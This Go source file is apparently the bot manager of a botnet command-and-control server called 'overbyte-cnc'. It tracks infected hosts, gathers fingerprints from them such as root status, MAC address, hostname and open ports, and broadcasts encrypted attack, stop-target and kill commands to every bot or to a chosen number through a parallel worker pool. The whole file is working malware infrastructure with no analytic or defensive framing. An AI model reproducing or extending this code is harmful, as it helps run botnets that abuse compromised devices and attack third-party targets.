package bot

import (
	"net"
	"sync"
	"time"

	"overbyte-cnc/crypto"
	"overbyte-cnc/logger"
)

type Bot struct {
	ID            string
	Conn          net.Conn
	Addr          string
	Arch          string
	LastPing      time.Time
	Connected     time.Time
	CPUCores      uint16
	TotalRAM      uint32
	FreeRAM       uint32
	SystemUptime  uint32
	IsRoot        bool
	LoadAvg1      float32
	LoadAvg5      float32
	NetInterfaces uint8
	ProcessCount  uint16
	OpenPorts     uint16
	DeviceType    string
	OSName        string
	Kernel        string
	SysInfoTime   time.Time
	Fingerprint   string
	CPUModel      string
	TotalDisk     uint32
	FreeDisk      uint32
	IPAddress     string
	MACAddress    string
	Hostname      string
	ArchName      string
	SwapTotal     uint32
	LoadAvg15     float32
	OpenFDCount   uint16
}

// BotSysInfo is used to update bot system information in a single struct
// instead of passing 20+ parameters.
type BotSysInfo struct {
	CPUCores      uint16
	TotalRAM      uint32
	FreeRAM       uint32
	SystemUptime  uint32
	IsRoot        bool
	LoadAvg1      float32
	LoadAvg5      float32
	NetInterfaces uint8
	ProcessCount  uint16
	OpenPorts     uint16
	DeviceType    string
	OSName        string
	Kernel        string
	CPUModel      string
	TotalDisk     uint32
	FreeDisk      uint32
	IPAddress     string
	MACAddress    string
	Hostname      string
	ArchName      string
	SwapTotal     uint32
	LoadAvg15     float32
	OpenFDCount   uint16
}

type BotShard struct {
	bots  map[string]*Bot
	mutex sync.RWMutex
}

type Manager struct {
	shards        [256]*BotShard
	pingInterval  time.Duration
	pingTimeout   time.Duration
	sendTimeout   time.Duration
	stopChan      chan struct{}
	attackEnabled bool
	attackMutex   sync.RWMutex
}

const (
	broadcastWorkers  = 64
	defaultSendTimeout = 5 * time.Second
)

func getShardIndex(id string) uint32 {
	var h uint32 = 2166136261
	for i := 0; i < len(id); i++ {
		h ^= uint32(id[i])
		h *= 16777619
	}
	return h % 256
}

func (m *Manager) getShard(id string) *BotShard {
	return m.shards[getShardIndex(id)]
}

func NewManager(pingInterval, pingTimeout time.Duration) *Manager {
	m := &Manager{
		pingInterval:  pingInterval,
		pingTimeout:   pingTimeout,
		sendTimeout:   defaultSendTimeout,
		stopChan:      make(chan struct{}),
		attackEnabled: true,
	}
	for i := 0; i < 256; i++ {
		m.shards[i] = &BotShard{bots: make(map[string]*Bot)}
	}
	return m
}

func (m *Manager) SetAttackEnabled(enabled bool) {
	m.attackMutex.Lock()
	m.attackEnabled = enabled
	m.attackMutex.Unlock()
}

func (m *Manager) IsAttackEnabled() bool {
	m.attackMutex.RLock()
	defer m.attackMutex.RUnlock()
	return m.attackEnabled
}

func (m *Manager) AddBot(conn net.Conn) *Bot {
	addr := conn.RemoteAddr().String()
	bot := &Bot{
		ID:        addr,
		Conn:      conn,
		Addr:      addr,
		LastPing:  time.Now(),
		Connected: time.Now(),
	}

	shard := m.getShard(addr)
	shard.mutex.Lock()
	shard.bots[addr] = bot
	shard.mutex.Unlock()

	return bot
}

func (m *Manager) RemoveBot(id string) {
	shard := m.getShard(id)
	shard.mutex.Lock()
	defer shard.mutex.Unlock()

	if bot, exists := shard.bots[id]; exists {
		bot.Conn.Close()
		delete(shard.bots, id)
	}
}

func (m *Manager) GetBotCount() int {
	count := 0
	for i := 0; i < 256; i++ {
		shard := m.shards[i]
		shard.mutex.RLock()
		count += len(shard.bots)
		shard.mutex.RUnlock()
	}
	return count
}

func (m *Manager) UpdateLastPing(id string) {
	shard := m.getShard(id)
	shard.mutex.Lock()
	defer shard.mutex.Unlock()

	if bot, exists := shard.bots[id]; exists {
		bot.LastPing = time.Now()
	}
}

func (m *Manager) UpdateArch(id, arch string) {
	shard := m.getShard(id)
	shard.mutex.Lock()
	defer shard.mutex.Unlock()

	if bot, exists := shard.bots[id]; exists {
		bot.Arch = arch
	}
}

func (m *Manager) GetArchCounts() map[string]int {
	counts := make(map[string]int)
	for i := 0; i < 256; i++ {
		shard := m.shards[i]
		shard.mutex.RLock()
		for _, bot := range shard.bots {
			arch := bot.Arch
			if arch == "" {
				arch = "unknown"
			}
			counts[arch]++
		}
		shard.mutex.RUnlock()
	}
	return counts
}

func (m *Manager) GetBot(id string) *Bot {
	shard := m.getShard(id)
	shard.mutex.RLock()
	defer shard.mutex.RUnlock()

	return shard.bots[id]
}

func (m *Manager) GetBotList() []*Bot {
	var list []*Bot
	for i := 0; i < 256; i++ {
		shard := m.shards[i]
		shard.mutex.RLock()
		for _, bot := range shard.bots {
			list = append(list, bot)
		}
		shard.mutex.RUnlock()
	}
	return list
}

// collectAllBots gathers bot references from all shards for broadcast operations.
func (m *Manager) collectAllBots() []*Bot {
	var all []*Bot
	for i := 0; i < 256; i++ {
		shard := m.shards[i]
		shard.mutex.RLock()
		for _, bot := range shard.bots {
			all = append(all, bot)
		}
		shard.mutex.RUnlock()
	}
	return all
}

// sendToBot sends encrypted data to a single bot with a write timeout.
func (m *Manager) sendToBot(bot *Bot, data []byte) error {
	bot.Conn.SetWriteDeadline(time.Now().Add(m.sendTimeout))
	err := crypto.SendEncrypted(bot.Conn, data)
	bot.Conn.SetWriteDeadline(time.Time{}) // clear deadline
	return err
}

// parallelSend sends data to a list of bots using a worker pool.
// Returns the number of successful sends. If maxBots > 0, stops after that many.
func (m *Manager) parallelSend(bots []*Bot, data []byte, maxBots int) int {
	if len(bots) == 0 {
		return 0
	}

	type botJob struct {
		bot *Bot
	}

	workers := broadcastWorkers
	if len(bots) < workers {
		workers = len(bots)
	}

	jobs := make(chan botJob, len(bots))
	var sent int64
	var sentMu sync.Mutex
	var wg sync.WaitGroup

	// Start workers
	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for job := range jobs {
				if maxBots > 0 {
					sentMu.Lock()
					if int(sent) >= maxBots {
						sentMu.Unlock()
						return
					}
					sentMu.Unlock()
				}
				if err := m.sendToBot(job.bot, data); err != nil {
					logger.Debug("[BOT] Failed to send to %s: %v", job.bot.Addr, err)
				} else {
					sentMu.Lock()
					sent++
					sentMu.Unlock()
				}
			}
		}()
	}

	// Feed jobs
	for _, bot := range bots {
		if maxBots > 0 {
			sentMu.Lock()
			if int(sent) >= maxBots {
				sentMu.Unlock()
				break
			}
			sentMu.Unlock()
		}
		jobs <- botJob{bot: bot}
	}
	close(jobs)
	wg.Wait()

	return int(sent)
}

func (m *Manager) BroadcastCommand(data []byte) int {
	if !m.IsAttackEnabled() {
		return 0
	}
	bots := m.collectAllBots()
	return m.parallelSend(bots, data, 0)
}

func (m *Manager) BroadcastToN(data []byte, maxBots int) int {
	if !m.IsAttackEnabled() {
		return 0
	}
	bots := m.collectAllBots()
	return m.parallelSend(bots, data, maxBots)
}

func (m *Manager) SendPingAll() {
	ping := []byte{CMD_PING}
	bots := m.collectAllBots()
	for _, bot := range bots {
		m.sendToBot(bot, ping)
	}
}

func (m *Manager) SendStopAll() int {
	stop := []byte{CMD_STOP}
	bots := m.collectAllBots()
	return m.parallelSend(bots, stop, 0)
}

func (m *Manager) SendStopTarget(ip string) int {
	ipBytes := net.ParseIP(ip)
	if ipBytes == nil {
		return 0
	}
	ipv4 := ipBytes.To4()
	if ipv4 == nil {
		return 0
	}

	cmd := make([]byte, 5)
	cmd[0] = CMD_STOP_TARGET
	copy(cmd[1:5], ipv4)

	bots := m.collectAllBots()
	return m.parallelSend(bots, cmd, 0)
}

func (m *Manager) SendKill(botID string) error {
	shard := m.getShard(botID)
	shard.mutex.RLock()
	bot, exists := shard.bots[botID]
	shard.mutex.RUnlock()

	if !exists {
		return nil
	}

	kill := []byte{CMD_KILL}
	return m.sendToBot(bot, kill)
}

func (m *Manager) KillAndRemoveBot(botID string) error {
	err := m.SendKill(botID)
	m.RemoveBot(botID)
	return err
}

func (m *Manager) KillAllBots() int {
	kill := []byte{CMD_KILL}
	bots := m.collectAllBots()
	sent := m.parallelSend(bots, kill, 0)

	go func() {
		time.Sleep(2 * time.Second)
		for i := 0; i < 256; i++ {
			shard := m.shards[i]
			shard.mutex.Lock()
			for _, bot := range shard.bots {
				bot.Conn.Close()
			}
			shard.bots = make(map[string]*Bot)
			shard.mutex.Unlock()
		}
	}()

	return sent
}

func (m *Manager) CleanupDeadBots() int {
	removed := 0
	now := time.Now()
	for i := 0; i < 256; i++ {
		shard := m.shards[i]
		shard.mutex.Lock()
		for id, bot := range shard.bots {
			if now.Sub(bot.LastPing) > m.pingTimeout {
				bot.Conn.Close()
				delete(shard.bots, id)
				removed++
			}
		}
		shard.mutex.Unlock()
	}
	return removed
}

func (m *Manager) StartPingLoop() {
	ticker := time.NewTicker(m.pingInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			m.SendPingAll()
			m.CleanupDeadBots()
		case <-m.stopChan:
			return
		}
	}
}

func (m *Manager) Stop() {
	close(m.stopChan)

	for i := 0; i < 256; i++ {
		shard := m.shards[i]
		shard.mutex.Lock()
		for _, bot := range shard.bots {
			bot.Conn.Close()
		}
		shard.bots = make(map[string]*Bot)
		shard.mutex.Unlock()
	}
}

type BotStats struct {
	TotalBots  int
	ArchCounts map[string]int
	AvgUptime  float64
	OldestBot  time.Duration
	NewestBot  time.Duration
}

// extractIPFromAddr extracts the IP portion from an addr like "1.2.3.4:12345"
func extractIPFromAddr(addr string) string {
	host, _, err := net.SplitHostPort(addr)
	if err != nil {
		return addr
	}
	return host
}

// GetBotByIP finds a bot by exact IP match (strips port from bot address).
func (m *Manager) GetBotByIP(ip string) *Bot {
	for i := 0; i < 256; i++ {
		shard := m.shards[i]
		shard.mutex.RLock()
		for _, bot := range shard.bots {
			if extractIPFromAddr(bot.Addr) == ip {
				shard.mutex.RUnlock()
				return bot
			}
		}
		shard.mutex.RUnlock()
	}
	return nil
}

// KickBot kicks a bot by exact IP match.
func (m *Manager) KickBot(ip string) bool {
	for i := 0; i < 256; i++ {
		shard := m.shards[i]
		shard.mutex.Lock()
		for id, bot := range shard.bots {
			if extractIPFromAddr(bot.Addr) == ip {
				bot.Conn.Close()
				delete(shard.bots, id)
				shard.mutex.Unlock()
				return true
			}
		}
		shard.mutex.Unlock()
	}
	return false
}

func (m *Manager) KickAllBots() int {
	count := 0
	for i := 0; i < 256; i++ {
		shard := m.shards[i]
		shard.mutex.Lock()
		count += len(shard.bots)
		for _, bot := range shard.bots {
			bot.Conn.Close()
		}
		shard.bots = make(map[string]*Bot)
		shard.mutex.Unlock()
	}
	return count
}

func (m *Manager) GetBotStats() BotStats {
	stats := BotStats{
		ArchCounts: make(map[string]int),
	}

	var totalUptime float64
	var oldest, newest time.Duration
	first := true

	for i := 0; i < 256; i++ {
		shard := m.shards[i]
		shard.mutex.RLock()
		stats.TotalBots += len(shard.bots)
		for _, bot := range shard.bots {
			arch := bot.Arch
			if arch == "" {
				arch = "unknown"
			}
			stats.ArchCounts[arch]++

			uptime := time.Since(bot.Connected)
			totalUptime += uptime.Seconds()

			if first {
				oldest = uptime
				newest = uptime
				first = false
			} else {
				if uptime > oldest {
					oldest = uptime
				}
				if uptime < newest {
					newest = uptime
				}
			}
		}
		shard.mutex.RUnlock()
	}

	if stats.TotalBots > 0 {
		stats.AvgUptime = totalUptime / float64(stats.TotalBots)
	}
	stats.OldestBot = oldest
	stats.NewestBot = newest

	return stats
}

func (m *Manager) RequestSysInfo(botID string) error {
	shard := m.getShard(botID)
	shard.mutex.RLock()
	bot, exists := shard.bots[botID]
	shard.mutex.RUnlock()

	if !exists {
		return nil
	}

	req := []byte{CMD_SYSINFO_REQ}
	return m.sendToBot(bot, req)
}

// UpdateBotSysInfo updates a bot's system information using a struct.
func (m *Manager) UpdateBotSysInfo(id string, info BotSysInfo) {
	shard := m.getShard(id)
	shard.mutex.Lock()
	defer shard.mutex.Unlock()

	if bot, exists := shard.bots[id]; exists {
		bot.CPUCores = info.CPUCores
		bot.TotalRAM = info.TotalRAM
		bot.FreeRAM = info.FreeRAM
		bot.SystemUptime = info.SystemUptime
		bot.IsRoot = info.IsRoot
		bot.LoadAvg1 = info.LoadAvg1
		bot.LoadAvg5 = info.LoadAvg5
		bot.NetInterfaces = info.NetInterfaces
		bot.ProcessCount = info.ProcessCount
		bot.OpenPorts = info.OpenPorts
		bot.DeviceType = info.DeviceType
		bot.OSName = info.OSName
		bot.Kernel = info.Kernel
		bot.CPUModel = info.CPUModel
		bot.TotalDisk = info.TotalDisk
		bot.FreeDisk = info.FreeDisk
		bot.IPAddress = info.IPAddress
		bot.MACAddress = info.MACAddress
		bot.Hostname = info.Hostname
		bot.ArchName = info.ArchName
		bot.SwapTotal = info.SwapTotal
		bot.LoadAvg15 = info.LoadAvg15
		bot.OpenFDCount = info.OpenFDCount
		bot.SysInfoTime = time.Now()
	}
}
